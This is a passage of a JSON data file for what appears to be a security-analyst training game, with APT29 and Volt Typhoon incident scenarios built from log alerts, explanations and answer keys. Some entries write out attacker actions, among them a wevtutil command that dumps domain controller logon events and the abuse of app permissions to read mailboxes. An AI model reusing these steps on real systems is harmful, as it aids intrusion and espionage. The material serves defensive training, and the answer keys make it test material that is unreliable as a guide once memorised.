secrets management","actor: svc_test_legacy (owner, test tenant)","new: client secret, 2-year expiry","app has admin consent in corp tenant since 2021"],"v":1,"x":"T1098.001","tell":"A fresh secret on an old app that bridges into prod, added by the account that just got sprayed. They are turning a forgotten app into a skeleton key.","c":"app-credential-add-context","k":[1,3],"diff":2,"say":"New two-year client secret on Legacy Test App, added by svc test legacy. The app has held admin consent in corp since 2021.","id":"inc_apt29_1"},{"d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Sign-in from new country","h":"jpark@corp.com","l":["IP: Mexico City \u00b7 ASN: Telmex","device: compliant iPhone \u00b7 MFA: number match","calendar: OOO \"Mexico vacation\""],"v":0,"x":"T1078.004","tell":"Compliant device, phishing-resistant-ish MFA, and an out-of-office that literally says Mexico. Not everything during an incident is the incident.","c":"travel-signin-context","k":[1,2],"diff":1,"say":"jpark signed in from Mexico City on a compliant iPhone with number-match MFA. Their calendar says out of office, Mexico vacation.","id":"inc_apt29_2"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"App credential added","h":"App: \"HR-Workday-Sync\"","l":["operation: Update application \u2013 Certificates and secrets management","actor: tbrooks@corp.com (app owner, PIM: Application Administrator)","old secret expires in 6 days \u00b7 ticket: CHG-8120 rotate secret","then: old secret removed 40 min later"],"v":0,"x":"T1098.001","tell":"Secret rotation looks exactly like backdooring an app. The difference: the named owner, an expiring secret, a ticket, and the old key gets deleted. Attackers never throw away spare keys.","c":"app-credential-add-context","k":[1,2,3],"diff":2,"say":"tbrooks, the app owner, rotated the HR Workday sync secret through PIM on a ticket. The old secret was expiring and got removed.","id":"inc_apt29_3"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"New app registration","h":"corp.com tenant","l":["app: \"Microsoft Graph Sync Service\" \u00b7 publisher: unverified","created by: Legacy Test App (app-only token, Application.ReadWrite.All)","client secret added at creation \u00b7 02:14 UTC"],"v":1,"x":"T1098.001","tell":"An app named to look like Microsoft, created by another app at 2am, born with a secret. They are building a second door in case you find the first.","c":"lookalike-app-registration","k":[0,1],"diff":2,"say":"A new app called Microsoft Graph Sync Service, unverified publisher, created at 2 a.m. by Legacy Test App using an app-only token, with a secret.","id":"inc_apt29_4"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"App permission granted","h":"App: \"Veeam Backup for Microsoft 365\"","l":["permission: Office 365 Exchange Online \u00b7 full_access_as_app (application)","consent by: lgarcia@corp.com (Exchange admin via PIM) \u00b7 ticket CHG-8133","publisher: Veeam Software (verified)","app registered by backup team via vendor setup wizard"],"v":0,"x":"T1098.002","tell":"full_access_as_app is scary on purpose, and backup tools genuinely need it. Verified publisher + a human admin + a ticket = sanctioned. An app granting it to another app at 2am = not.","c":"mail-app-permission-consent","k":[1,2],"diff":3,"say":"Veeam Backup, a verified publisher, was granted full access as app to Exchange. Consent by the Exchange admin through PIM, on a change ticket.","id":"inc_apt29_5"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"App permission granted","h":"App: \"Microsoft Graph Sync Service\"","l":["permission: Office 365 Exchange Online \u00b7 full_access_as_app (application)","granted by: Legacy Test App (app-only, no human in the loop)","publisher: unverified \u00b7 app is 9 min old"],"v":1,"x":"T1098.002","tell":"full_access_as_app = read ANY mailbox via EWS, no user sign-in. Granted by an app, to a 9-minute-old app, with no human anywhere. Jackpot permission, stolen.","c":"mail-app-permission-consent","k":[1,2],"diff":2,"say":"The nine-minute-old Graph Sync Service app got full access as app to Exchange, granted by Legacy Test App, with no human involved.","id":"inc_apt29_6"},{"d":"cloud","src":"Exchange Online \u00b7 MailItemsAccessed","t":"App reading mailboxes","h":"ceo@, cfo.smith@, legal@, ciso@","l":["AppId: Microsoft Graph Sync Service","protocol: EWS \u00b7 MailAccessType: Bind \u00b7 11,000 items \u00b7 4 mailboxes","client IP: rotating residential proxies","items opened: threads containing \"Midnight Blizzard\", \"APT29\""],"v":1,"x":"T1114.002","tell":"Four hand-picked mailboxes, residential IPs, and they are reading what you know about THEM. APT29 checks whether it has been caught.","c":"app-mailbox-access-baseline","k":[0,2,3],"diff":1,"say":"The Graph Sync Service app opened eleven thousand items in four executive and security mailboxes over EWS, from residential IPs, reading Midnight Blizzard threads.","id":"inc_apt29_7"},{"d":"cloud","src":"Exchange Online \u00b7 MailItemsAccessed","t":"App reading mailboxes","h":"all 4,100 mailboxes","l":["AppId: Veeam Backup for Microsoft 365","MailAccessType: Sync \u00b7 client IP: 203.0.113.10 (corp egress, backup proxy)","schedule: nightly 01:00 \u00b7 matches 30-day baseline"],"v":0,"x":"T1114.002","tell":"Every mailbox, every night, from your own egress, same as the last 30 days. Backup is the noisiest \"mail collection\" you will ever see. Baseline it once and sleep.","c":"app-mailbox-access-baseline","k":[1,2],"diff":2,"say":"Veeam backup syncing all four thousand mailboxes from the corp backup proxy at 1 a.m., the same as every night for thirty days.","id":"inc_apt29_8"}]},{"id":"inc_volt","g":"G1017","title":"Living Off Your Land","diff":3,"intro":"No malware. No phishing. No ransom note. Just a Chinese state crew using your own Windows tools, through your own firewall, slowly, for months. Your admins use the same tools. Good luck.","win":"You caught Volt Typhoon living off the land on your DCs, slammed the firewall door, and did not wreck the OT vendor's firmware window. Pre-positioning denied. Crew captured.","lose":"Volt Typhoon stayed for 300 days and mapped your whole OT network, or you escalated every admin with a CLI and IR muted you. You found out from CISA. Run it back.","contain":{"at":5,"ask":"ntds.dit just left DC-01 via the firewall's LDAP account. Move?","o":["Isolate and fix the FortiGate, rotate its creds, plan double krbtgt reset","Disable svc_fortinet_ldap and close it out","Reimage SRV-DC-01 tonight"],"a":0,"why":"The door is the edge box and every hash is gone. Close the door, then burn the secrets, krbtgt twice. Reimaging a DC fixes neither."},"a":[{"d":"network","src":"Firewall \u00b7 FortiGate event log","t":"Admin login to firewall","h":"fw-edge-01","l":["admin login via HTTPS GUI from 64.x.x.x","source: EOL Cisco RV320 on residential ISP (KV botnet range)","preceded by: 1,200 malformed SSL-VPN requests, 2 crash/restarts","mgmt interface: exposed to internet \u00b7 FortiOS unpatched"],"v":1,"x":"T1190","tell":"Exploit-shaped noise, then an admin session from a hijacked home router. Volt Typhoon hides behind botnets of dead SOHO gear so the source looks like a random ISP customer.","c":"edge-admin-login-source","k":[1,2],"diff":2,"say":"Admin login to the edge FortiGate from an end-of-life Cisco home router, right after malformed SSL VPN requests crashed the firewall twice.","id":"inc_volt_0"},{"d":"endpoint","src":"Windows Security \u00b7 4624","t":"Logon to domain controller","h":"SRV-DC-01 \u00b7 CORP\\svc_fortinet_ldap","l":["logon type: 10 (RemoteInteractive / RDP)","source: 10.0.0.1 (fw-edge-01 inside interface)","baseline: account has only ever done type 3 LDAP binds"],"v":1,"x":"T1078.002","tell":"They pulled the LDAP bind creds out of the firewall config. A bind account that suddenly RDPs into a DC is not binding anything.","c":"service-account-logon-type","k":[0,2],"diff":2,"say":"The firewall LDAP service account made an RDP logon to the domain controller from the firewall itself. It has only ever done network binds.","id":"inc_volt_1"},{"d":"network","src":"Firewall \u00b7 FortiGate event log","t":"Admin login to firewall","h":"fw-edge-01","l":["admin login via HTTPS GUI from 10.99.0.12 (mgmt VLAN jump host)","user: netadmin.ruiz \u00b7 FortiToken MFA","ticket: CHG-6620 add NAT rule for vendor portal","config diff: 1 policy added, matches ticket"],"v":0,"x":"T1078.003","tell":"Internal mgmt VLAN, a named admin with a token, a ticket, and a config diff that matches it. Not every firewall login tonight is Beijing.","c":"edge-admin-login-source","k":[0,1,3],"diff":1,"say":"Firewall admin login from the management VLAN jump host with FortiToken MFA, on a NAT rule ticket, and the config diff matches.","id":"inc_volt_2"},{"d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Event log query","h":"PAW-IT-03 \u00b7 CORP\\adm.okafor","l":["cmd: wevtutil qe Security /r:SRV-DC-01 /c:20 /rd:true /f:text /q:\"*[System[(EventID=4740)]]\"","ticket: INC-49102 \"jlee locked out every 10 min\"","source: privileged access workstation \u00b7 interactive \u00b7 MFA"],"v":0,"x":"T1654","tell":"Same wevtutil, different story: a named admin on a PAW pulling 20 lockout events for an open ticket. LOTL detection is always who, from where, and why now.","c":"log-query-who-and-why","k":[1,2],"diff":2,"say":"An admin on a privileged workstation pulled the last twenty lockout events from the DC, tied to a ticket about jlee getting locked out.","id":"inc_volt_3"},{"d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Event log query","h":"SRV-DC-01 \u00b7 CORP\\svc_fortinet_ldap","l":["cmd: wevtutil qe Security /rd:true /f:text /q:\"*[System[(EventID=4624)]]\" > C:\\Windows\\Temp\\l.txt","session: RDP from 10.0.0.1","ticket: none"],"v":1,"x":"T1654","tell":"Dumping every successful logon to learn who logs in where, so they can blend in. Recon using your own logging. Rude.","c":"log-query-who-and-why","k":["h",1],"diff":2,"say":"The firewall service account, in an RDP session on the DC, dumped every successful lo
